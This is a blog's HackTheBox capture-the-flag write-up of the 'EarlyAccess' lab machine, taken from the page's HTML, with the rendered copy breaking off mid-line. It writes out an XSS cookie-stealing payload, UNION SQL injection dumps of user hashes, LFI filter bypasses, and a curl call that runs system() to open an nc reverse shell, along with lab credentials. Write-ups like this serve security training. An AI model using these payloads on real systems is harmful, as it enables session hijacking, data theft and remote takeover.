<!DOCTYPE html><html lang="en" dir="auto"><head><meta charset="utf-8"/><meta http-equiv="x-ua-compatible" content="IE=edge"/><meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no"/><meta name="robots" content="index, follow"/><title>HackTheBox Writeup: EarlyAccess | Zebra</title><meta name="keywords" content="cybersecurity,ctf,linux,hackthebox"/><meta name="description" content="Really fun machine where OSINT is very important. I learned about Docker container privilege escalation."/><meta name="author" content="Zebra"/><link rel="canonical" href="https://xzebra.dev/blog/hackthebox_writeup_earlyaccess/"/><link crossorigin="anonymous" href="/assets/css/stylesheet.523aabfa2b5ee217ac92d035cb44bf463d5d30a14b08f7aa59ccfdbebf4501f8.css" integrity="sha256-Ujqr+ite4hesktA1y0S/Rj1dMKFLCPeqWcz9vr9FAfg=" rel="preload stylesheet" as="style"/><script defer="" crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload="hljs.initHighlightingOnLoad()"></script>
<link rel="icon" href="https://xzebra.dev/images/favicon.ico"/><link rel="icon" type="image/png" sizes="16x16" href="https://xzebra.dev/images/favicon-16x16.png"/><link rel="icon" type="image/png" sizes="32x32" href="https://xzebra.dev/images/favicon-32x32.png"/><link rel="apple-touch-icon" href="https://xzebra.dev/images/apple-touch-icon.png"/><link rel="mask-icon" href="https://xzebra.dev/safari-pinned-tab.svg"/><meta name="msapplication-TileColor" content="#2e2e33"/><link rel="alternate" hreflang="en" href="https://xzebra.dev/blog/hackthebox_writeup_earlyaccess/"/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="HackTheBox Writeup: EarlyAccess"/><meta property="og:description" content="Really fun machine where OSINT is very important. I learned about Docker container privilege escalation."/><meta property="og:type" content="article"/><meta property="og:url" content="https://xzebra.dev/blog/hackthebox_writeup_earlyaccess/"/><meta property="og:image" content="https://xzebra.dev/images/posts/prod-files-secure.s3.us-west-2.amazonaws.com_cGM8w0K.png"/><meta property="article:section" content="blog"/><meta property="article:published_time" content="2021-12-02T23:37:00+07:00"/><meta property="article:modified_time" content="2023-05-13T11:10:00+07:00"/><meta property="og:site_name" content="Zebra"/><meta property="og:see_also" content="https://xzebra.dev/blog/hackthebox_writeup_developer/"/><meta property="og:see_also" content="https://xzebra.dev/blog/hackthebox_writeup_unicode/"/><meta property="og:see_also" content="https://xzebra.dev/blog/hackthebox_writeup_backdoor/"/><meta property="og:see_also" content="https://xzebra.dev/blog/hackthebox_writeup_shibboleth/"/><meta property="og:see_also" content="https://xzebra.dev/blog/hackthebox_writeup_pikaboo/"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:image" content="https://xzebra.dev/images/posts/prod-files-secure.s3.us-west-2.amazonaws.com_cGM8w0K.png"/><meta name="twitter:title" content="HackTheBox Writeup: EarlyAccess"/><meta name="twitter:description" content="Really fun machine where OSINT is very important. I learned about Docker container privilege escalation."/><script type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Blog","item":"https://xzebra.dev/blog/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeup: EarlyAccess","item":"https://xzebra.dev/blog/hackthebox_writeup_earlyaccess/"}]}</script><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"HackTheBox Writeup: EarlyAccess","name":"HackTheBox Writeup: EarlyAccess","description":"Really fun machine where OSINT is very important. I learned about Docker container privilege escalation.","keywords":["cybersecurity","ctf","linux","hackthebox"],"articleBody":"Enumeration While trying to enumerate I got the following message. So we have to perform a slower enumeration.\nYou are banned! Our WAF detected suspicious traffic coming from your IP! You are temporarily banned from accessing the webpage for one minute.\nWe can read in the forum the following:\nSupport 10 hours ago Hello 3lit3H4kr, Thank you for reaching out to us. Due to the high load of traffic our Game-Key verification-API is currently experiencing issues. We are implementing a solution to fallback to manual verification by the support staff. Please use the contact form to privately contact an administrative user and send the Game-Key for manual verification. We are incredibly sorry for the inconvenience this has caused you. We are doing our best to resolve this issue promptly. Take care, your Support-Team Also, there is another issue saying that invalid usernames are only handled on register.\nThank you for reaching out to us. Our internal team has already added this to our Bug-Tracker and is currently working on resolving this issue permanently. For now, a temporary fix was issued that prevents creation of accounts with invalid usernames. (Your account is also affected by this change!) We are incredibly sorry for the inconvenience this has caused and will update you as soon as we have resolved this problem. Please feel welcome to reach out to us with any further questions you may as we would be more than happy to help. Getting the foothold We can try to change our name to and send an email with subject and body also with alerts. Once it is sent, we will get the alert when inspecting the message.\nSessions are stored in a simple cookie called earlyaccess_session. We can try to hijack the cookie of the admin account. Let’s set our name to:\n\u003cscript\u003e document.location = \"http://10.10.14.81:8080/?\" + document.cookie; \u003c/script\u003e We will get the following in our http server:\n10.10.11.110 - - [02/Dec/2021 12:10:31] \"GET /?XSRF-TOKEN=eyJpdiI6IkVEU0gwZHdrWGtOVWJVTkl1eVg2eXc9PSIsInZhbHVlIjoiU1hOdXlNSVZvM0dkMkdvd0JMMUxTNVU2WHB1MWQxREJXSlFFbDcxR3hrUmpuQ0drN3h5SjNSUi9tZWZ4b25qSUxzZmNlTnUxMEd6OEhqdG5CMEhvZzhxSjRRWjhwOXhzMWoxSWJ2UFRtVUwvN1NOMk1FMkVFSnpiNjdBTTUxd0MiLCJtYWMiOiJhMTdhOWUxYmU2ZTVjY2VmODIyNjI0ZjNjOTM4ZTdlNDkxNjkyZWM3NGYyODk2NWFiMzgyZjUyOWIxZmNjM2U4In0%3D;%20earlyaccess_session=eyJpdiI6Ikpza3pGZHRqTUpkVUxYMnNJdURRalE9PSIsInZhbHVlIjoiclRVTHVFNmVUWGt1NDVDWUZ6dGxqbUFSYkYwYWc1YW00eHdtZjNJZUxwUWxnSkFtbThyMEV6OXZoK3VsR0RWWGJucVN3YmpOSm94WUdNOVFicC9WMTRubS9qQzlqSlV6NHJ3WE0wZzlXanZzM2JrWjVJY2wyVmloSHl2eFJSa0kiLCJtYWMiOiJjYjY3MGE0ZjExYjM2YTI5Mzg3ZWNmY2JlZWE4MTAwYzg1NGQ1OTA0MmUzYTMwNzljYTFmYzgxNGQyMjYwNGNhIn0%3D HTTP/1.1\" 200 - If we change our earlyaccess_session to the one we retrieved, we are now logged in as admin.\nIn the admin page you can download a backup of the key validator. There are also two subdomains: dev and game.\nIf we look into the key validator code, we see the following:\nmagic_num = 346 # TODO: Sync with API (api generates magic_num every 30min) So keys are validated using a magic number which is given by the server. I’ve tried to get it from https://earlyaccess.htb/key/magic_num, but that is not the endpoint. So we will have to fuzz it.\nLet’s implement first the key generator. After some time reading the code, the key is divided in 4 parts and a checksum. Most of the parts can be fixed, so we have to generate keys in the form of:\nKEY98-AZAZ2-XP???-GAML8-... Where the ??? part may be any combination of 2 letters and 1 number which follow the g3 expression, which uses the magic number. I used the following to generate it:\ndef gen_g3(magic_num) -\u003e str: for i in letters: for j in letters: for n in string.digits: s = sum(bytearray(('XP' + ''.join([i,j,n])).encode())) if s == magic_num: return 'XP' + ''.join([i,j,n]) The last part is simply computed after generating all the previous parts. We will have to fuzz all the possible magic_num verifying the key in the /key/verify endpoint, as we can’t know this number.\nOnce we got a key for the game, we can now go back to our user account and activate it. After this, we will be able to enter the game. In this case, it is using php.\nWe can see the leaderboard they were talking about in the forums. And yes, if we change our profile name to a single quote we get the following error in the scoreboard:\nError SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '''') ORDER BY scoreboard.score DESC LIMIT 11' at line 1 According to the error given, we can’t replace the SQL request. But we can perform UNION SQL injection to get results:\n') UNION SELECT * FROM scoreboard; -- We just need to show only the same number of columns in the table:\n') UNION SELECT 1,2,3 FROM scoreboard; -- Username Score Time 3 1 2 Now that we know it works and it is a MySQL database, we can get the table names from the information_schema table.\n') UNION SELECT 1, table_name, 1 FROM information_schema.tables; -- Username Score Time 1 1 failed_logins 1 1 scoreboard 1 1 users We can now do the same with the columns of the table users.\n') UNION SELECT 1, column_name, 1 FROM information_schema.columns WHERE TABLE_NAME = 'users'; -- Username Score Time 1 1 id 1 1 name 1 1 email 1 1 password 1 1 role 1 1 key 1 1 created_at 1 1 updated_at And simply dump the important fields:\n') UNION SELECT email, role, password FROM users; -- Username Score Time 618292e936625aca8df61d5fff5c06837c49e491 admin@earlyaccess.htb admin d997b2a79e4fc48183f59b2ce1cee9da18aa5476 chr0x6eos@earlyaccess.htb user 584204a0bbe5e392173d3dfdf63a322c83fe97cd firefart@earlyaccess.htb user 290516b5f6ad161a86786178934ad5f933242361 farbs@earlyaccess.htb user 4c900fbf77c0222faddb3b648b876e32cb723a04 test@test.com user And we dumped the users!\nWe can decode this hash using SHA1 type (code 100).\nhashcat hash.txt /usr/share/dict/rockyou.txt -D 1 -m 100 The decrypted password gameover.\nNow we can login to the page with admin@earlyaccess.htb:gameover credentials. Also to the dev subdomain we couldn’t access before.\nThe hashing page looks useless, but the File-Tools one seems promising. Although, there is no visible endpoint so we may have to look for it.\nThe hashing page sends a request to /actions/hash.php. So I guess it will be in /actions/file.php? We can send the same request of Hash-Tools, but to the file.php endpoint:\ncurl -X POST -v http://dev.earlyaccess.htb/actions/file.php \\ -H 'Cookie: PHPSESSID=8baffcc3aa52dbc5d891e66f37d4f1c8' \\ -d 'action=hash\u0026redirect=true\u0026password=test\u0026hash_function=md5' And it works! Well… there is an error, but now we know there is an endpoint there.\n\u003ch1\u003eERROR:\u003c/h1\u003ePlease specify file!% We can try with POST parameters.\nwfuzz -w /usr/share/dirbuster/parameter-names.txt \\ -u http://dev.earlyaccess.htb/actions/file.php --hc 404 --hh 35 \\ -b \"PHPSESSID=8baffcc3aa52dbc5d891e66f37d4f1c8\" \\ -d \"action=file\u0026redirect=true\u0026FUZZ=test\" Although, I didn’t get any result. After some time I decided to try with GET.\nwfuzz -w /usr/share/dirbuster/parameter-names.txt \\ -u 'http://dev.earlyaccess.htb/actions/file.php?FUZZ=test' --hc 404 --hh 35 \\ -b \"PHPSESSID=8baffcc3aa52dbc5d891e66f37d4f1c8\" And we get a result!\n===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000001316: 500 0 L 2 W 32 Ch \"filepath\" There is a filepath parameter. I thought it would be some file upload, but it seems like it will be some LFI.\nIf we try to enter a filepath with .., we get an error:\nERROR: For security reasons, reading outside the current directory is prohibited! I guess we can access the hash.php file. We cannot traverse the path, but I will try to fuzz for some files or weird configs.\nwfuzz -w /usr/share/dirbuster/vulns/file_inclusion_linux.txt \\ -u 'http://dev.earlyaccess.htb/actions/file.php?filepath=FUZZ' --hc 500 --hh 35 \\ -b \"PHPSESSID=8baffcc3aa52dbc5d891e66f37d4f1c8\" I got the following results:\n===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000002179: 200 4 L 36 W 463 Ch \"\\xampp\\phpmyadmin\\phpinfo.php\" 000002178: 200 4 L 36 W 472 Ch \"\\xampp\\phpmyadmin\\config.inc.php\" 000002175: 200 4 L 36 W 463 Ch \"\\xampp\\phpMyAdmin\\phpinfo.php\" 000002174: 200 4 L 36 W 472 Ch \"\\xampp\\phpMyAdmin\\config.inc.php\" 000002192: 200 4 L 36 W 406 Ch \"config.php\" 000002221: 200 4 L 36 W 412 Ch \"users.db.php\" 000002210: 200 4 L 36 W 409 Ch \"install.php\" 000002198: 200 4 L 36 W 412 Ch \"database.php\" 000002199: 200 4 L 36 W 394 Ch \"db.php\" 000002195: 200 4 L 36 W 400 Ch \"data.php\" 000002190: 200 4 L 36 W 418 Ch \"config.inc.php\" 000002187: 200 4 L 36 W 409 Ch \"_config.php\" But all are false positives. Well, at least we know the path has to end in .php.\nWe can try other techniques to bypass the restrictions for LFI. There is one that works:\n?filepath=php://filter/convert.base64-encode/resource=hash.php If we look closer at the code:\n// DEVELOPER-NOTE: There has gotta be an easier way... ob_start(); // Use inputted hash_function to hash password $hash = @$hash_function($password); Hahaha that developer note. If we try to change the inputted hash_function, we get an error:\nOnly MD5 and SHA1 are currently supported! If we keep reading the code, this appears:\n// Only allow custom hashes, if `debug` is set if($_REQUEST['hash_function'] !== \"md5\" \u0026\u0026 $_REQUEST['hash_function'] !== \"sha1\" \u0026\u0026 !isset($_REQUEST['debug'])) throw new Exception(\"Only MD5 and SHA1 are currently supported!\"); Okay, so we can just set the debug parameter and run whatever function we want? Seems promising.\ncurl -X POST -v http://dev.earlyaccess.htb/actions/hash.php \\ -H 'Cookie: PHPSESSID=8baffcc3aa52dbc5d891e66f37d4f1c8' \\ -d 'action=hash\u0026redirect=true\u0026password=test\u0026hash_function=asdf\u0026debug=true' We will get the following:\nStack trace: #0 /var/www/earlyaccess.htb/dev/actions/hash.php(53): hash_pw('asdf', 'test') #1 {main} thrown in \u003cb\u003e/var/www/earlyaccess.htb/dev/actions/hash.php on line 9\nSo yeah, it is working that way.\ncurl -X POST -v http://dev.earlyaccess.htb/actions/hash.php -L \\ -H 'Cookie: PHPSESSID=8baffcc3aa52dbc5d891e66f37d4f1c8' \\ -d 'action=hash\u0026redirect=true\u0026password=whoami\u0026hash_function=system\u0026debug=true' curl -X POST -v http://dev.earlyaccess.htb/actions/hash.php -L \\ -H 'Cookie: PHPSESSID=8baffcc3aa52dbc5d891e66f37d4f1c8' \\ -d 'action=hash\u0026redirect=true\u0026password=nc+10.10.14.81+6666+-e+/bin/bash\u0026hash_function=system\u0026debug=true' And we will have a reverse shell!\nwww-data@webserver:/var/www/earlyaccess.htb/dev/actions$ cat /etc/passwd | grep bash cat /etc/passwd | grep bash root❌0:0:root:/root:/bin/bash www-adm❌1000:1000::/home/www-adm:/bin/bash Getting the user flag We can change to user www-adm using the admin password (gameover). In its home:\nwww-adm@webserver:~$ cat .wetrc cat .wgetrc user=api password=s3CuR3_API_PW! But it seems like we are not in the user yet…\nwww-adm@webserver:/var/www/html$ cat /etc/cron.daily/passwd cat /etc/cron.daily/passwd #!/bin/sh cd /var/backups || exit 0 for FILE in passwd group shadow gshadow; do test -f /etc/$FILE || continue cmp -s $FILE.bak /etc/$FILE \u0026\u0026 continue cp -p /etc/$FILE $FILE.bak \u0026\u0026 chmod 600 $FILE.bak done www-adm@webserver:/var/www/html/routes$ ps -e -o command ps -e -o command COMMAND /bin/sh -c /root/entry.sh /bin/sh /root/entry.sh /usr/sbin/cron apache2 -DFOREGROUND apache2 -DFOREGROUND apache2 -DFOREGROUND apache2 -DFOREGROUND apache2 -DFOREGROUND apache2 -DFOREGROUND apache2 -DFOREGROUND apache2 -DFOREGROUND apache2 -DFOREGROUND apache2 -DFOREGROUND sh -c nc 10.10.14.81 6666 -e /bin/bash bash python3 -c import pty; pty.spawn(\"/bin/bash\") /bin/bash su www-adm bash apache2 -DFOREGROUND ps -e -o command Okay, so the api service is not running in this machine. Also, we are not able to use any network tools so we might be in a minimal system, such as a container.\nWe can check if we are inside a container like this:\nwww-adm@webserver:/var/www/html/routes$ cat /proc/self/cgroup cat /proc/self/cgroup 11:cpuset:/docker/6ee9f16fc8b07752dd80c894879cdbc7f08755bdaf91b44d5b6fa29b91d4612c 10:pids:/docker/6ee9f16fc8b07752dd80c894879cdbc7f08755bdaf91b44d5b6fa29b91d4612c 9:memory:/docker/6ee9f16fc8b07752dd80c894879cdbc7f08755bdaf91b44d5b6fa29b91d4612c 8:cpu,cpuacct:/docker/6ee9f16fc8b07752dd80c894879cdbc7f08755bdaf91b44d5b6fa29b91d4612c 7:blkio:/docker/6ee9f16fc8b07752dd80c894879cdbc7f08755bdaf91b44d5b6fa29b91d4612c 6:net_cls,net_prio:/docker/6ee9f16fc8b07752dd80c894879cdbc7f08755bdaf91b44d5b6fa29b91d4612c 5:perf_event:/docker/6ee9f16fc8b07752dd80c894879cdbc7f08755bdaf91b44d5b6fa29b91d4612c 4:freezer:/docker/6ee9f16fc8b07752dd80c894879cdbc7f08755bdaf91b44d5b6fa29b91d4612c 3:devices:/docker/6ee9f16fc8b07752dd80c894879cdbc7f08755bdaf91b44d5b6fa29b91d4612c 2:rdma:/ 1:name=systemd:/docker/6ee9f16fc8b07752dd80c894879cdbc7f08755bdaf91b44d5b6fa29b91d4612c 0::/system.slice/containerd.service And we indeed are.\nIf we check /etc/hosts, we see an entry for the webserver. So the API might be called api or apiserver?\nWe can wget to api and the name will be resolved by Docker DNS:\nwget api:5000 We get the following:\n{\"message\":\"Welcome to the game-key verification API! You can verify your keys via: /verify/. If you are using manual verification, you have to synchronize the magic_num here. Admin users can verify the database using /check_db.\",\"status\":200} By using the check_db endpoint, we can see the logs of the database. There is an interesting part, where some credentials are stored:\n\"Env\": [ \"MYSQL_DATABASE=db\", \"MYSQL_USER=drew\", \"MYSQL_PASSWORD=drew\", \"MYSQL_ROOT_PASSWORD=XeoNu86JTznxMCQuGHrGutF3Csq5\", \"SERVICE_TAGS=dev\", \"SERVICE_NAME=mysql\", \"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\", \"GOSU_VERSION=1.12\", \"MYSQL_MAJOR=8.0\", \"MYSQL_VERSION=8.0.25-1debian10\" ], As we saw before in the original page, drew has email draw@earlyaccess.htb, so he might be a user of the system. We can try the usernames and passwords we got by now to try to get into the ssh.\nAnd we can login with drew:XeoNu86JTznxMCQuGHrGutF3Csq5 to the ssh endpoint. And now we can get the user flag! God it has been a really long path.\n","wordCount":"1858","inLanguage":"en","image":"https://xzebra.dev/images/posts/prod-files-secure.s3.us-west-2.amazonaws.com_cGM8w0K.png","datePublished":"2021-12-02T23:37:00+07:00","dateModified":"2023-05-13T11:10:00+07:00","author":{"@type":"Person","name":"Zebra"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://xzebra.dev/blog/hackthebox_writeup_earlyaccess/"},"publisher":{"@type":"Organization","name":"Zebra","logo":{"@type":"ImageObject","url":"https://xzebra.dev/images/favicon.ico"}}}</script></head><body id="top"><header class="header"><nav class="nav"><ul id="menu" style="margin-left:auto"><li><a href="https://xzebra.dev/" title="whoami"><span>whoami</span></a></li><li><a href="https://xzebra.dev/blog/" title="blog"><span>blog</span></a></li><li><a href="https://xzebra.dev/apps/" title="apps"><span>apps</span></a></li></ul></nav></header><main class="main"><article class="post-single"><header class="post-header"><h1 class="post-title">HackTheBox Writeup: EarlyAccess</h1><div><ul class="post-series"><span class="secondary-text">This post belongs to this series:</span><li><a rel="noopener noreferrer" href="https://xzebra.dev/series/hackthebox/" class="link-highlight" style="--highlight-color:#9fef00">HackTheBox Machines</a></li></ul></div><div class="post-description">Really fun machine where OSINT is very important. I learned about Docker container privilege escalation.</div><div class="post-meta"><span title="2021-12-02 23:37:00 +0700 +0700">December 2, 2021</span> · 9 min · Zebra</div></header><figure class="entry-cover"><img loading="lazy" src="https://xzebra.dev/images/posts/prod-files-secure.s3.us-west-2.amazonaws.com_cGM8w0K.png" alt=""/></figure><div class="post-content"><h1 id="enumeration">Enumeration<a hidden="" class="anchor" aria-hidden="true" href="#enumeration">#</a></h1><p>While trying to enumerate I got the following message. So we have to perform a slower enumeration.</p><blockquote><p>You are banned! Our WAF detected suspicious traffic coming from your
IP! You are temporarily banned from accessing the webpage for one
minute.</p></blockquote><p>We can read in the forum the following:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="display:flex"><span><span style="color:#a6e22e">Support</span> <span style="color:#ae81ff">10</span> <span style="color:#a6e22e">hours</span> <span style="color:#a6e22e">ago</span>
</span></span><span style="display:flex"><span><span style="color:#a6e22e">Hello</span> <span style="color:#ae81ff">3</span><span style="color:#a6e22e">lit3H4kr</span>,
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span><span style="color:#a6e22e">Thank</span> <span style="color:#a6e22e">you</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">reaching</span> <span style="color:#a6e22e">out</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">us</span>.
</span></span><span style="display:flex"><span><span style="color:#a6e22e">Due</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">high</span> <span style="color:#a6e22e">load</span> <span style="color:#66d9ef">of</span> <span style="color:#a6e22e">traffic</span> <span style="color:#a6e22e">our</span> <span style="color:#a6e22e">Game</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Key</span> <span style="color:#a6e22e">verification</span><span style="color:#f92672">-</span><span style="color:#a6e22e">API</span> <span style="color:#a6e22e">is</span> <span style="color:#a6e22e">currently</span> <span style="color:#a6e22e">experiencing</span> <span style="color:#a6e22e">issues</span>. <span style="color:#a6e22e">We</span> <span style="color:#a6e22e">are</span> <span style="color:#a6e22e">implementing</span> <span style="color:#a6e22e">a</span> <span style="color:#a6e22e">solution</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">fallback</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">manual</span> <span style="color:#a6e22e">verification</span> <span style="color:#a6e22e">by</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">support</span> <span style="color:#a6e22e">staff</span>.
</span></span><span style="display:flex"><span><span style="color:#a6e22e">Please</span> <span style="color:#a6e22e">use</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">contact</span> <span style="color:#a6e22e">form</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">privately</span> <span style="color:#a6e22e">contact</span> <span style="color:#a6e22e">an</span> <span style="color:#a6e22e">administrative</span> <span style="color:#a6e22e">user</span> <span style="color:#a6e22e">and</span> <span style="color:#a6e22e">send</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">Game</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Key</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">manual</span> <span style="color:#a6e22e">verification</span>. <span style="color:#a6e22e">We</span> <span style="color:#a6e22e">are</span> <span style="color:#a6e22e">incredibly</span> <span style="color:#a6e22e">sorry</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">inconvenience</span> <span style="color:#66d9ef">this</span> <span style="color:#a6e22e">has</span> <span style="color:#a6e22e">caused</span> <span style="color:#a6e22e">you</span>. <span style="color:#a6e22e">We</span> <span style="color:#a6e22e">are</span> <span style="color:#a6e22e">doing</span> <span style="color:#a6e22e">our</span> <span style="color:#a6e22e">best</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">resolve</span> <span style="color:#66d9ef">this</span> <span style="color:#a6e22e">issue</span> <span style="color:#a6e22e">promptly</span>.
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span><span style="color:#a6e22e">Take</span> <span style="color:#a6e22e">care</span>, <span style="color:#a6e22e">your</span> <span style="color:#a6e22e">Support</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Team</span>
</span></span></code></pre></div><p>Also, there is another issue saying that invalid usernames are only
handled on register.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="display:flex"><span><span style="color:#a6e22e">Thank</span> <span style="color:#a6e22e">you</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">reaching</span> <span style="color:#a6e22e">out</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">us</span>.
</span></span><span style="display:flex"><span><span style="color:#a6e22e">Our</span> <span style="color:#a6e22e">internal</span> <span style="color:#a6e22e">team</span> <span style="color:#a6e22e">has</span> <span style="color:#a6e22e">already</span> <span style="color:#a6e22e">added</span> <span style="color:#66d9ef">this</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">our</span> <span style="color:#a6e22e">Bug</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Tracker</span> <span style="color:#a6e22e">and</span> <span style="color:#a6e22e">is</span> <span style="color:#a6e22e">currently</span> <span style="color:#a6e22e">working</span> <span style="color:#a6e22e">on</span> <span style="color:#a6e22e">resolving</span> <span style="color:#66d9ef">this</span> <span style="color:#a6e22e">issue</span> <span style="color:#a6e22e">permanently</span>. <span style="color:#a6e22e">For</span> <span style="color:#a6e22e">now</span>, <span style="color:#a6e22e">a</span> <span style="color:#a6e22e">temporary</span> <span style="color:#a6e22e">fix</span> <span style="color:#a6e22e">was</span> <span style="color:#a6e22e">issued</span> <span style="color:#a6e22e">that</span> <span style="color:#a6e22e">prevents</span> <span style="color:#a6e22e">creation</span> <span style="color:#66d9ef">of</span> <span style="color:#a6e22e">accounts</span> <span style="color:#66d9ef">with</span> <span style="color:#a6e22e">invalid</span> <span style="color:#a6e22e">usernames</span>. (<span style="color:#a6e22e">Your</span> <span style="color:#a6e22e">account</span> <span style="color:#a6e22e">is</span> <span style="color:#a6e22e">also</span> <span style="color:#a6e22e">affected</span> <span style="color:#a6e22e">by</span> <span style="color:#66d9ef">this</span> <span style="color:#a6e22e">change</span><span style="color:#f92672">!</span>)
</span></span><span style="display:flex"><span><span style="color:#a6e22e">We</span> <span style="color:#a6e22e">are</span> <span style="color:#a6e22e">incredibly</span> <span style="color:#a6e22e">sorry</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">inconvenience</span> <span style="color:#66d9ef">this</span> <span style="color:#a6e22e">has</span> <span style="color:#a6e22e">caused</span> <span style="color:#a6e22e">and</span> <span style="color:#a6e22e">will</span> <span style="color:#a6e22e">update</span> <span style="color:#a6e22e">you</span> <span style="color:#a6e22e">as</span> <span style="color:#a6e22e">soon</span> <span style="color:#a6e22e">as</span> <span style="color:#a6e22e">we</span> <span style="color:#a6e22e">have</span> <span style="color:#a6e22e">resolved</span> <span style="color:#66d9ef">this</span> <span style="color:#a6e22e">problem</span>. <span style="color:#a6e22e">Please</span> <span style="color:#a6e22e">feel</span> <span style="color:#a6e22e">welcome</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">reach</span> <span style="color:#a6e22e">out</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">us</span> <span style="color:#66d9ef">with</span> <span style="color:#a6e22e">any</span> <span style="color:#a6e22e">further</span> <span style="color:#a6e22e">questions</span> <span style="color:#a6e22e">you</span> <span style="color:#a6e22e">may</span> <span style="color:#a6e22e">as</span> <span style="color:#a6e22e">we</span> <span style="color:#a6e22e">would</span> <span style="color:#a6e22e">be</span> <span style="color:#a6e22e">more</span> <span style="color:#a6e22e">than</span> <span style="color:#a6e22e">happy</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">help</span>.
</span></span></code></pre></div><h1 id="getting-the-foothold">Getting the foothold<a hidden="" class="anchor" aria-hidden="true" href="#getting-the-foothold">#</a></h1><p>We can try to change our name to <code>&lt;script&gt;alert(&#34;test&#34;)&lt;/script&gt;</code> and
send an email with subject and body also with alerts. Once it is sent,
we will get the alert when inspecting the message.</p><p>Sessions are stored in a simple cookie called <code>earlyaccess_session</code>. We
can try to hijack the cookie of the admin account. Let’s set our name
to:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="display:flex"><span>&lt;<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex"><span>  document.<span style="color:#a6e22e">location</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://10.10.14.81:8080/?&#34;</span> <span style="color:#f92672">+</span> document.<span style="color:#a6e22e">cookie</span>;
</span></span><span style="display:flex"><span>&lt;/<span style="color:#f92672">script</span>&gt;
</span></span></code></pre></div><p>We will get the following in our http server:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="display:flex"><span><span style="color:#ae81ff">10.10</span>.<span style="color:#ae81ff">11.110</span> <span style="color:#f92672">-</span> <span style="color:#f92672">-</span> [<span style="color:#ae81ff">02</span><span style="color:#f92672">/</span><span style="color:#a6e22e">Dec</span><span style="color:#f92672">/</span><span style="color:#ae81ff">2021</span> <span style="color:#ae81ff">12</span><span style="color:#f92672">:</span><span style="color:#ae81ff">10</span><span style="color:#f92672">:</span><span style="color:#ae81ff">31</span>] <span style="color:#e6db74">&#34;GET 